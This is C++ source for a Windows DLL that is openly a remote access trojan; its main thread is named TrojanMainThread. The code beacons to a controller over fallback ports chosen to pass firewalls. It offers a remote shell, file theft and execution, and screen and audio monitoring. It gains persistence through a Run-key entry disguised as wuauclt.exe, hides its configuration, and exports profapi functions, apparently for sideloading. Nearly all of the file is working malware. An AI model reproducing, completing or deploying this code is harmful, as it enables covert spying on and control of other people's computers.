// svrCtrlDll.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"

#include <vector>
#include <string>
#include <map>
#include <set>
#include <time.h>

#include "svrctrl.h"
#include "conn.h"
#include "svrdll.h"
#include "svrcmdtab.h"
#include "macro.h"
#include "WjcDes.h"
#include "zlib.h""

#include <Windows.h>
#include <process.h>
#include <WinSock2.h>
#include <shlobj.h>

#include "fileoperation.h"
#include "queryinfo.h"
#include "execcmd.h"
#ifndef TRIVAL 
#include "processMgr.h"
#include "screen.h"
#include "audioMgr.h"
#endif
using namespace std;

typedef vector<pair<int, int > > CandidateConnPair;

#define ENABLE_SERVICE
#define MYDBG

static CRITICAL_SECTION myMutex;
static char myBuf[10240];

static char iniFile[512];
static char machineName[512];
static vector<string> allClientIPs;	//���п��õ�IP
static conn gConn;
static bool gExit = false;
static string gClientIP;

//	��ѡsocket���Ͷ˿�
static int gConnType;
static int gPort;
static union client_cfg gConnCFG;

CmdTables gCmdTables;
map<string, HMODULE>	dllHandles;

union client_cfg *gCFG = NULL;

SERVICE_STATUS_HANDLE hSrv;
DWORD dwCurrState;
HMODULE hDll = NULL;
bool hasInit = false;

BOOL APIENTRY DllMain(HMODULE hModule, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		hDll = hModule;
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

/************************************************************************/
/* �������ݸ��ͻ��ˣ�֧�ּ��ܺͷǼ��ܸ�ʽ                               */
/************************************************************************/
static int WriteDataToClient(conn s, struct control_header* header, const char* buf, int n)
{
	//���ܷ�ʽ����
	int flag = (header == NULL) ? 0 : header->isCompressed; //1Ϊ���� 2Ϊѹ��
	if(flag && n > 0)
	{
		int ret = 0;
		int len = (flag == 1) ? (n / 8 + 1) * 8 : compressBound(n);
		char* encry = new char[len+4];
	
		memset(encry, 0, len);
		int outLen = 0;
		
		if(flag == 1)
		{
			outLen = Des_Go(encry, (char*)buf, n, myKey, strlen(myKey), ENCRYPT);//��������
			if(outLen < 0) { ret = DES_ERROR; goto leave; }
		}
		else 
		{
			outLen = compress((Bytef *)(encry+4), (uLongf *)&len, (Bytef *)buf, n);
		
			if(outLen != Z_OK)	{ ret = COMPRESS_ERROR; goto leave;}
			else if(len > 1100)	{ ret = WRITE_TOOLONG; goto leave;}
			else {outLen = len + 4; *(int*)encry = n; }
		}

		header->dataLen = outLen;
		if(conn_write(s, (const char*)header, sizeof(*header), 0) < 0)//����Ӧ��ͷ���ݣ�������
		{
			ret = WRITE_ERROR;
			goto leave;
		}
		if(conn_write(s, encry, outLen, 0) < 0)//���ͼ��ܵ���������
		{	
			ret = WRITE_ERROR;
			goto leave;
		}

		ret = sizeof(*header) + outLen;
leave:
		delete []encry;
		return ret;
	}

	//�����ܷ�ʽ����
noEncrypt:
	if(header)	header->dataLen = n;
	if(header && conn_write(s, (const char*)header, sizeof(*header), 0) < 0)
		return WRITE_ERROR;
	if(n && conn_write(s, buf, n, 0) < 0)
		return WRITE_ERROR;
	return header ? sizeof(*header) + n : n;
}

static struct sock_funcs mySockFuncs = 
{
	conn_socket,
	conn_connect,
	conn_read,
	WriteDataToClient,
	conn_close,
	conn_inet_addr,
	conn_htons,
	conn_error
};

/************************************************************************/
/*����һ��DLL���					                                     */
/************************************************************************/
HMODULE LoadPluginFunc(const string& fileName)
{
	char dllName[MAX_PATH] = {0};
	getDllInfo dllInfos;
	getFuncCnt dllFunCnt;
	onUninitialize destroyFun;
	onInitialize initFunc;

	sprintf(dllName, "%s", fileName.c_str());
	HMODULE handle = LoadLibraryA(dllName);

	if(handle)
	{
		dllFunCnt = (getFuncCnt)GetProcAddress(handle, "GetDllFuncCnt");
		if(!dllFunCnt)	return handle;

		dllInfos = (getDllInfo)GetProcAddress(handle, "GetDllFuncs");
		if(!dllInfos)	return handle;

		destroyFun = (onUninitialize)GetProcAddress(handle, "OnUninitialize");

		initFunc = (onInitialize)GetProcAddress(handle, "OnInitialize");

		int nCount = dllFunCnt();
		const dll_info* infos = dllInfos();
		for(int j = 0; j < nCount; j++)
		{
			if(infos[j].reserved < gCmdTables[infos[j].cmd].reserved)
				continue;
			
			cmd_table cmdTab;
			cmdTab.cmdID = infos[j].cmd;
			cmdTab.reserved = infos[j].reserved;
			cmdTab.func = (coreFunc)GetProcAddress(handle, infos[j].name);
			cmdTab.destroy = destroyFun;
			cmdTab.init = initFunc;
			strncpy(cmdTab.name, fileName.c_str(), sizeof(cmdTab.name)); 
			gConnCFG.cfg1.reserved = &mySockFuncs;
			if(initFunc)	initFunc(&gConnCFG);

			gCmdTables[cmdTab.cmdID] = cmdTab;		
		}
	}

	return handle;
}

/************************************************************************/
/*�������п��õ�DLL������Ƴ�ʼ�������                                 */
/************************************************************************/
int LoadAllDllFunc(const vector<string>& dllNames)
{
	if(dllNames.size() == 0)	return -1;

	for(int i = 0; i < dllNames.size(); i++)
	{
		dllHandles[dllNames[i]] = LoadPluginFunc(dllNames[i]);
	}

	return 0;
}


HANDLE CopyEvent;
struct DispatchStruct
{
	unsigned short cmd;
	char* buf;
	int n;
};

/************************************************************************/
/* ���������ֵķַ�����ȫ��������в��Ҵ����������е��ú������д��� */
/************************************************************************/
unsigned int WINAPI DispatchThread(void* p)
{
	DispatchStruct* param = (DispatchStruct*)p;
	unsigned short cmd = param->cmd;
	int n = param->n;
	
	CmdTables::iterator iter;
	coreFunc func;
	int nStatus;

	if((iter = gCmdTables.find(cmd)) == gCmdTables.end() || !(func = iter->second.func))
	{
		nStatus = ERR_NOTHISMODULE;
		control_header header = INITIALIZE_HEADER(cmd);
		header.response = nStatus;
		WriteDataToClient(gConn, &header, NULL, 0);
		SetEvent(CopyEvent);
		return nStatus;
	}
	
	char* buf = NULL;
	if(n  > 0)
	{
		buf = new char[n+1];
		memset(buf, 0, n+1);
		memcpy(buf, param->buf, n);
	}
	SetEvent(CopyEvent);
	nStatus = func(gConn, buf, n, WriteDataToClient);

	delete []buf;
	return nStatus;
}

/************************************************************************/
/* ���������ֵķַ�                                                     */
/************************************************************************/
int DispatchCommand(unsigned short cmd, char* buf, int n)
{
	DispatchStruct myParam = {cmd, buf, n};
	CopyEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	unsigned int threadId;
	
	HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, DispatchThread, &myParam, 0, &threadId);
	WaitForSingleObject(CopyEvent, INFINITE);
	CloseHandle(hThread);
	CloseHandle(CopyEvent);

	return 0;
}

/************************************************************************/
/* ���Ự���Ӷ�ʧ������DLL����ģ���һЩ��Դ                            */
/************************************************************************/
int DestoryResourceIfNessary(conn s)
{
	for(CmdTables::iterator it = gCmdTables.begin(); it != gCmdTables.end(); it++)
	{
		onUninitialize destroyFun = it->second.destroy;
		if(destroyFun)	destroyFun(s);
	}
	return 0;
}

static int ShutdownMachine()
{
	EnablePrivilege(SE_SHUTDOWN_NAME, TRUE);				//���ùػ���Ȩ
	ExitWindowsEx(EWX_FORCE | EWX_SHUTDOWN, 0);				//�ر� Windows

	return 0;
}

static int RebootMachine()
{
	EnablePrivilege(SE_SHUTDOWN_NAME, TRUE);				//���ùػ���Ȩ
	ExitWindowsEx(EWX_FORCE | EWX_REBOOT, 0);				//���� Windows

	return 0;
}

static int ChangeName(char* newName)
{
	strncpy(machineName, newName, sizeof(machineName));
	WritePrivateProfileStringA("Settings", "name", newName, iniFile);	

	control_header header = INITIALIZE_ENCYRPT_HEADER(CONTROL_CHANGE_TEXT);
	header.response = 0;
	WriteDataToClient(gConn, &header, NULL, 0);

	return 0;
}

/************************************************************************/
/* ���²��                                                              */
/************************************************************************/
static int UpdatePlugin(char* buf, int n)
{
	dir_info *info = (dir_info*)buf;
	char dllname[MAX_PATH] = {0}, path[MAX_PATH] = {0};
	int size = info->fileSizeLow;
	char* content = new char[size];
	int totalN = 0, readN;
	control_header header;
	int nStatus = 0;
	char name[32] = {0};

	GetCurrentDirectoryA(MAX_PATH, path);
	sprintf(dllname, "%s\\%s.DLL", path, info->name);
	strcpy(name, info->name);

	//��ȡdll������ļ�����
	while(totalN < size)
	{
		readN = conn_read(gConn, (char*)&header, sizeof(header), 0);
		if(readN <= 0 || header.command != CONTROL_INFO_FILE)
		{
			nStatus = ERR_FAILCONN;
			break;
		}

		readN = conn_read(gConn, content+totalN, header.dataLen, 0);
		if(readN <= 0)
		{
			nStatus = ERR_FAILCONN;
			break;
		}

		if(header.isCompressed)
		{
			readN = Des_Go(content+totalN, content+totalN, readN, myKey, strlen(myKey), DECRYPT);
			if(readN < 0)	break;
		}

		totalN += readN;
	}

leave:
	if(nStatus == 0)
	{
		//�����ǰ����Ѿ����ڣ���ж��֮
		const char* dll = strlwr(info->name);
		if(dllHandles[dll] && FreeLibrary(dllHandles[dll]))
			dllHandles[dll] = NULL;
		
		//д��Ӳ��

		HANDLE hFile = CreateFileA(dllname, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, 
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile == INVALID_HANDLE_VALUE)
		{
			nStatus = GetLastError();
			goto myexit;
		}

		DWORD nWritten = 0;
		WriteFile(hFile, content, size, &nWritten, NULL);
		CloseHandle(hFile);
		
		//���ز��
		if((dllHandles[dll] = LoadPluginFunc(dll)) == NULL)
			nStatus = GetLastError();

		//���������ļ�
		if(nStatus == 0)
		{
			if(strstr(gCFG->cfg1.cmdModules, dll) == NULL)
			{
				strcat(gCFG->cfg1.cmdModules, dll);
				strcat(gCFG->cfg1.cmdModules, "|");
			}
			WritePrivateProfileStringA("Settings", "modules", gCFG->cfg1.cmdModules, iniFile);	

			SetFileAttributesA(iniFile, FILE_ATTRIBUTE_HIDDEN);
		}
	}

myexit:
	REASSIGN_HEADER(header, CONTROL_UPDATE, nStatus);
	header.dataLen = sizeof(name);
	WriteDataToClient(gConn, &header, name, sizeof(name));
	delete []content;
	return nStatus;
}


/************************************************************************/
/* ж�ز��                                                              */
/************************************************************************/
static int UnloadPlugin(char* buf, int n)
{
	string pluginStillOn = "";
	for(map<string, HMODULE>::iterator it = dllHandles.begin(); it != dllHandles.end(); /*it++*/)
	{
		int nStatus = ERR_UNKNOWN;
		string dllStr = string(it->first);
		char dll[32] = {0};

		strcpy(dll, dllStr.c_str());

		if(dllHandles[dll] && FreeLibrary(dllHandles[dll]) == FALSE)	
		{
			nStatus = GetLastError();
			pluginStillOn += string(dll) + "|";
			goto leave;
		}
		else
		{
			nStatus = 0;
			dllHandles[dll] = NULL;
		}

		//KDebug("process uninstall %s", dll);
		//KDebug("before deleting %d\n", gCmdTables.size());
		for(CmdTables::iterator itera = gCmdTables.begin(); itera != gCmdTables.end(); /*itera++*/)
		{
			if(itera->second.reserved == 0)
				continue;

			if(stricmp(itera->second.name, dll) == 0)
				gCmdTables.erase(itera++);
			else
				itera ++;
		}
		//KDebug("after deleting %d", gCmdTables.size());

		char dllname[MAX_PATH] = {0}, path[MAX_PATH] = {0};
		GetCurrentDirectoryA(MAX_PATH, path);
		sprintf(dllname, "%s\\%s.DLL", path, dll);
		DeleteFileA(dllname);
		
leave:
		if(nStatus == 0)dllHandles.erase(it++);
		else			it++;

		control_header header = INITIALIZE_ENCYRPT_HEADER(CONTROL_UNINSTALL);
		header.dataLen = sizeof(dll);
		header.response = nStatus;
		WriteDataToClient(gConn, &header, dll, sizeof(dll));
	}

	//û��Ȩ��
	WritePrivateProfileStringA("Settings", "modules", pluginStillOn.c_str(), iniFile);
	SetFileAttributesA(iniFile, FILE_ATTRIBUTE_HIDDEN);
	
	return 0;
}

/************************************************************************/
/* ���ܿͻ����������ݲ�����Ӧ����                                       */
/************************************************************************/
unsigned int WINAPI WorkDispatchThread(void* p)
{
	int n = 0, nRet, nTry = 0;
	char buf[8196] = {0};
	const int maxRetry = 500;

	//�ӿͻ��˶�ȡ���ݣ�������֤Ϊ��Ч����������ַ��ͻ��˵����ָ����Ӧ�������ģ��
	while(1)
	{
		//����һ���߳��˳��ˣ�
		if(gExit == true)	break;
		
		control_header header;
		conn_set allConns;
		allConns.push_back(gConn);
		conn_set readConns, excpConns;
		int r = conn_selectEx(allConns, &readConns, &excpConns, 5000);
		if(r < 0)	{ /*KDebug("selectEx failed %d", conn_error);*/ break; }
		else if(r == 0)	continue;//��ʱ

		/*
		if(CONN_ISSET(gConn, &excpConns))
		{
			KDebug("select --> gConn excepion\n");
			break; 
		}*/
		n = conn_read(gConn, (char*)&header, sizeof(header), 0);
		if(n < 0)
		{
			//KDebug("read error because of %d\n", conn_error);
			break; 
		}

		//��֤���ݰ�
		if(nTry == maxRetry) break;
		if(!ISVALID_HEADER(header) || n == 0)	{ nTry ++; continue;}

		//KDebug("Recv %d header %d bytes data, cmd 0x%04x", n, header.dataLen, header.command);

		//��ȡ��������Ķ�������
		n = header.dataLen;
		if(n > 0)
		{
			memset(buf, 0, sizeof(buf));
			n = conn_read(gConn, buf, n, 0);
			if(n < 0)	{gExit = true; return -1;}
		}

		//�ַ�����
		switch(header.command)
		{
		case CONTROL_FEEDBACK://ֱ������
			break;
		case CONTROL_UPDATE:
			UpdatePlugin(buf, n);
			break;
		case CONTROL_UNINSTALL:
			UnloadPlugin(buf, n);
			break;
		case CONTROL_RESTART_SYSTEM:
			RebootMachine();
			break;
		case CONTROL_SHUTDOWN_SYSTEM:
			ShutdownMachine();
			break;
		case CONTROL_CHANGE_TEXT:
			ChangeName(buf);
			break;
		default:
			DispatchCommand(header.command, buf, n);
			break;
		}
	}
	
	gExit = true;
	return 0;
}

/************************************************************************/
/* ��ʱ���ͻ��˷���KeepAlive��Ϣ                                        */
/************************************************************************/
unsigned int WINAPI KeepAliveThread(void* p)
{
	const int keepLen = sizeof(struct keepalive_info);
	const int maxKeepCnt = 256;
	const int headerLen = sizeof(struct control_header);
	int nWrite = 0;

	{
		struct control_header header = INITIALIZE_HEADER(CONTROL_LOGIN);
		header.reserved = OS_WINDOWS;
		header.dataLen = strlen(machineName)+1;
		MakeGuid((unsigned char*)header.password);
		if( WriteDataToClient(gConn, &header, machineName, strlen(machineName)+1)  < 0)
			return 0;
	}
		
	while(1)
	{
		//����һ���߳��˳��ˣ�
		if(gExit == true)	break;
		
		struct control_header header = INITIALIZE_HEADER(CONTROL_KEEPALIVE);
		struct keepalive_info info[maxKeepCnt];

		int nCmd = 0;
		for(CmdTables::iterator it = gCmdTables.begin(); it != gCmdTables.end(); it++)
		{
			info[nCmd].cmd = it->second.cmdID;
			info[nCmd].reserved = it->second.reserved;
			nCmd++;
			if(nCmd == maxKeepCnt)	break;
		}
		//KDebug("[%d %d %d]\n", nCmd, keepLen, nCmd*keepLen);
		header.reserved = OS_WINDOWS;
		header.dataLen = keepLen * nCmd;
		MakeGuid((unsigned char*)header.password);

		nWrite = WriteDataToClient(gConn, &header, (const char*)&info, nCmd*keepLen);
		if(nWrite < 0)
		{
			//KDebug("write error because of %d\n", conn_error);
			break;
		}

		Sleep(30000);
	}

	gExit = true;
	return 0;
}

#define ADD_INTERNEL_ENTRY(id, moduleName, coreFun, initFun, destroyFun)\
{																		\
	cmd_table cmdTab;													\
	cmdTab.cmdID = id;													\
	cmdTab.reserved = 0;													\
	cmdTab.func = coreFun;												\
	cmdTab.destroy = destroyFun;										\
	cmdTab.init = initFun;												\
	strncpy(cmdTab.name, moduleName, sizeof(cmdTab.name));				\
	if(initFun)	initFun(&gConnCFG);										\
	gCmdTables[cmdTab.cmdID] = cmdTab;									\
}

int loadConfig()
{
	gCFG = new union client_cfg;
	char selfFile[MAX_PATH] = {0}, path[MAX_PATH] = {0};
	
	GetCurrentDirectoryA(MAX_PATH, path);
	sprintf(iniFile, "%s\\plugin.ini", path);

	do
	{
		//���ȶ�ȡ������Ϣ��λ��PE�ļ������
		if(GetModuleFileNameA(hDll, selfFile, MAX_PATH) == 0)
			break;
		
		FILE* fp = fopen(selfFile, "rb");
		if(fp == NULL)	break;
		if(fseek(fp , 0 - sizeof(union client_cfg) , SEEK_END))
		{
			fclose(fp);
			break;
		}
		fread(gCFG, sizeof(union client_cfg) , 1, fp);
		fclose(fp);

		//�Ƿ�Ϊ�Ϸ���������Ϣ
		if(memcmp(gCFG, CFG_MAGIC, 8) != 0)
			break;

		//��������Ϣ����
		unsigned char* pp = (unsigned char*)gCFG;
		for (int i = sizeof(CFG_MAGIC); i < sizeof(gCFG->cfg1); i++)
			pp[i] ^= 0xFF;
	}while(0);

	
	char savedModules[256];
	GetPrivateProfileStringA("Settings", "modules", "", savedModules, sizeof(savedModules), iniFile);
	if(savedModules[0] != 0) strcpy(gCFG->cfg1.cmdModules, savedModules);

	char user[MAX_PATH] = {0};
	DWORD len = MAX_PATH;
	GetComputerNameA(user, &len);
	GetPrivateProfileStringA("Settings", "name", "", machineName, sizeof(machineName), iniFile);
	if(strcmp(machineName, "") == 0)
		strcpy(machineName, user);

	unsigned long addr = conn_inet_addr(gCFG->cfg1.clientIP);
	//�����ַΪ������ʽ����ѯDNS��ȡ������IP��ѡ��ַ
	if(addr == INADDR_NONE ){
		GetSiteIP(allClientIPs, gCFG->cfg1.clientIP);
	}
	//�ͻ���ַ����IP��ʽ
	else	allClientIPs.push_back(gCFG->cfg1.clientIP);

	string allModules = strlwr(gCFG->cfg1.cmdModules);
	vector<string> allDlls;
	int nStart = 0;
	int nPos = allModules.find("|", nStart);
	bool self = false;
	while(nPos != string::npos)
	{
		string thisPlugin = allModules.substr(nStart, nPos-nStart);
		if(stricmp("self", thisPlugin.c_str()) == 0)
			self = true;
		else
			allDlls.push_back(thisPlugin);
		nStart = nPos + 1;
		nPos = allModules.find("|", nStart);
	}
	
	{
		ADD_INTERNEL_ENTRY(CONTROL_QUERY_INFO, "self", QueryInfomation, NULL, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_REQUEST_SHELL, "self", CmdShell, NULL, OnCmdUninitialize);
		ADD_INTERNEL_ENTRY(CONTROL_ENUM_DISKS, "self", EnumAllDrives, OnInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_ENUM_FILES, "self", EnumDir, OnInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_CREATE_DIR, "self", CreateDir, OnInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_COPY_FILE, "self", CopyFileOrDir, OnInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_RENAME_FILE, "self", RenameFileOrDir, OnInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_DELETE_FILE, "self", DeleteFileOrDir, OnInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_UPLOAD_FILE, "self", UploadFileOrDir, OnInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_DOWNLOAD_FILE, "self", DownloadFileOrDir, OnInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_SEARCH_FILE, "self", SearchFile, OnInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_RUN_FILE, "self", ExecFile, OnInitialize, NULL);		
#ifndef TRIVAL 
		ADD_INTERNEL_ENTRY(CONTROL_ENUM_PROCS, "self", EnumProcess, NULL, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_KILL_PROCS, "self", KillProcess, NULL, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_AUDIO_INIT, "self", AudioMonitor, OnAudioInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_AUDIO_CLOSE, "self", AudioDestroy, OnAudioInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_MONITOR_SCREEN, "self", MonitorScreen, OnScreenInitialize, NULL);
		ADD_INTERNEL_ENTRY(CONTROL_CLOSE_SCREEN, "self", CloseScreen, OnScreenInitialize, NULL);
#endif
		WritePrivateProfileStringA("Settings", "modules", "self|", iniFile);
		SetFileAttributesA(iniFile, FILE_ATTRIBUTE_HIDDEN);
	}

	LoadAllDllFunc(allDlls);

	{
		char buff[1024];
		HKEY hkRoot = HKEY_CURRENT_USER, hkParam = 0;
		strncpy(buff, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", sizeof buff);
		if( ERROR_SUCCESS == RegOpenKeyExA(hkRoot, buff, 0, KEY_ALL_ACCESS, &hkRoot))
		{
			const char wuauclt[] = {'w', 'u', 'a', 'u', 'c', 'l', 't', '\0'};
			const char ms[] = {'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\0'}; 
			const char exe[] = {'.', 'e', 'x', 'e', '\0'};
			const char prof[] = {'p', 'r', 'o', 'f', 'a', 'p', 'i', '.', 'd', 'l', 'l', '\0'};
			char appPath[MAX_PATH];
			SHGetSpecialFolderPath(NULL, appPath, CSIDL_APPDATA, FALSE);

			strcat(appPath, "\\");
			strcat(appPath, ms);
			strcat(appPath, "\\");
			strcat(appPath, wuauclt);
			strcat(appPath, "\\");
			strcat(appPath, wuauclt);
			strcat(appPath, exe);
		
			RegSetValueExA(hkRoot, wuauclt, 0, REG_SZ, (unsigned char*)appPath, strlen(appPath)+1);
		}
	}

	InitializeCriticalSection(&myMutex);

	return 0;
}

unsigned int WINAPI TrojanMainThread(void* p)
{
	CandidateConnPair allPairs;
	bool bConnected = false;
	char buf[1024];
	
	//���ȳ�ʼ���������еĶ˿���Ϣ
	allPairs.push_back(make_pair(gCFG->cfg1.conn_type, gCFG->cfg1.port));
	//��β������ǽ������˿�
	for(int i = 0; i < sizeof(tcpPorts)/sizeof(int); i++)	allPairs.push_back(make_pair(CONN_TCP, tcpPorts[i]));
	for(int i = 0; i < sizeof(udpPorts)/sizeof(int); i++)	allPairs.push_back(make_pair(CONN_UDP1, udpPorts[i]));
	for(int i = 0; i < sizeof(httpPorts)/sizeof(int); i++)	allPairs.push_back(make_pair(CONN_HTTP_CLIENT, httpPorts[i]));
	int nPos = allPairs.size();
	
	while(1)
	{
		bConnected = false;

		//����DNS
		if(allClientIPs.size() == 0)
		{
			GetSiteIP(allClientIPs, gCFG->cfg1.clientIP);
			Sleep(3000);
		}
		
		//�������ӿͻ��ˣ�����ͻ����ڶ��IP�Ļ������ҳ�һ�����ʵĿ��������ϵ�
		for(int i = 0; i < allClientIPs.size(); i++)
		{
			if(bConnected == true)	break;
			
			for(int nPair = 0; nPair < allPairs.size(); nPair++)
			{
				if(bConnected == true)	break;

				int thisType = allPairs[nPair].first;
				int thisPort = allPairs[nPair].second;
				if((gConn = conn_socket(thisType))  == NULL)
				{
					Sleep(1000);
					continue;
				}

				sockaddr_in addr;
				addr.sin_family = AF_INET;
				addr.sin_port = conn_htons(thisPort);
				addr.sin_addr.s_addr = conn_inet_addr(allClientIPs[i].c_str());
				//KDebug("%d: try connect to address %s [%d, %d]... ", nPair, allClientIPs[i].c_str(), thisType, thisPort);
				int r = conn_connect(gConn, (const struct sockaddr*)&addr, sizeof(addr));//���Ӽ�ض� 
				if(r == 0)
				{
					//�Ͻ�����һ����Ǹ���ضˣ�����ע������һ������������
					unsigned char task = 'M';
					conn_write(gConn, (char*)&task, sizeof(task), 0);

					//��Чʱ����û�õ���ض˵���Ӧ���Ƴ�
					int nRecv = conn_read(gConn, buf, sizeof(control_header), 0);
					control_header* myHdr = (control_header*)buf;
					//KDebug("nRecv = %d", nRecv);
					if(nRecv != sizeof(*myHdr) || !ISVALID_HEADER(*myHdr) || myHdr->command != CONTROL_FEEDBACK)
					{
						//KDebug("[Cancel] No makesure responce\n");
						conn_close(gConn);
						Sleep(1000);
						continue;
					}
					
					gClientIP = allClientIPs[i];
					gConnType = thisType;
					gPort = thisPort;
					
					//����ػ�����Ϣ��ip,�˿ڣ����͡����͸��������
					strncpy(gConnCFG.cfg1.clientIP, gClientIP.c_str(), sizeof(gConnCFG.cfg1.clientIP));
					gConnCFG.cfg1.port = thisPort;
					gConnCFG.cfg1.conn_type = thisType;
					gConnCFG.cfg1.reserved = &mySockFuncs;
					for(CmdTables::iterator iter = gCmdTables.begin(); iter != gCmdTables.end(); iter++)
					{
						onInitialize init = iter->second.init;
						//KDebug("onInitialize %p %s %s", init, iter->second.name, gConnCFG.cfg1.clientIP);
						if(init)	init(&gConnCFG);
					}

					//�����������ϵ��Ƶ�ĩβ�����������ӿ��л���
					if(nPos > 1)
					{
						//KDebug("%d <--> %d\n", nPair, nPos -1);
						pair<int, int> thisPair = allPairs[nPair];
						allPairs[nPair] = allPairs[nPos -1];
						allPairs[nPos -1] = thisPair;
						if(--nPos == 1)	nPos = allPairs.size();
					}
					
					bConnected = true;
					//KDebug("[OK]\n");
					break;
				}
				//KDebug("[Cancel] Reason %d\n", conn_error);
				conn_close(gConn);
				Sleep(1000);
			}
		}

		//���ӳɹ��������߳̾��崦����������ʱ����KeepAlive��Ϣ
		if(bConnected == true)	
		{
			int opt = 15000, optlen;

			//���÷��ͺͽ������ݵ�timeoutֵ������Ҫ������
			conn_setsockopt(gConn, 0, ConnOpt::CONN_RCVTIMEO, &opt, sizeof(opt));
			conn_setsockopt(gConn, 0, ConnOpt::CONN_SNDTIMEO, &opt, sizeof(opt));

			conn_getsockopt(gConn, 0, ConnOpt::CONN_RCVTIMEO, &opt, &optlen);
			conn_getsockopt(gConn, 0, ConnOpt::CONN_SNDTIMEO, &opt, &optlen);
			
			gExit = false;
			HANDLE hThreads[2];
			unsigned int threadId1, threadId2;
			hThreads[0] = (HANDLE)_beginthreadex(NULL, 0, WorkDispatchThread, NULL, 0, &threadId1);
			hThreads[1] = (HANDLE)_beginthreadex(NULL, 0, KeepAliveThread, NULL, 0, &threadId2);

			WaitForMultipleObjects(2, hThreads, TRUE, INFINITE);

			CloseHandle(hThreads[0]);
			CloseHandle(hThreads[1]);		

			//KDebug("connection closed");
			
			DestoryResourceIfNessary(gConn);
			conn_close(gConn);
		}
		else 
		{
			Sleep(5000);
		}
	}
}

//RealService just create a process 
int RealService()
{
	if(hasInit == true)
		return 0;

	conn_startup();

	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)	SetProcessWindowStation(hWinSta);

	loadConfig();
	
	HANDLE hThread;
	unsigned int threadId;
	hThread = (HANDLE)_beginthreadex(NULL, 0, TrojanMainThread, NULL, 0, &threadId);
	//WaitForSingleObject(hThread, INFINITE);

	hasInit = true;
	return 0;
}


int _stdcall profapi_104(unsigned int a,unsigned int b,unsigned int c,int d)
{
	if(hasInit == true)
		return 0;

	conn_startup();
	
	loadConfig();
	
	HANDLE hThread;
	unsigned int threadId;
	hThread = (HANDLE)_beginthreadex(NULL, 0, TrojanMainThread, NULL, 0, &threadId);
	WaitForSingleObject(hThread, INFINITE);

	hasInit = true;
	return 0;

}

signed int _stdcall profapi_102(int a)
{
	return -1;
}
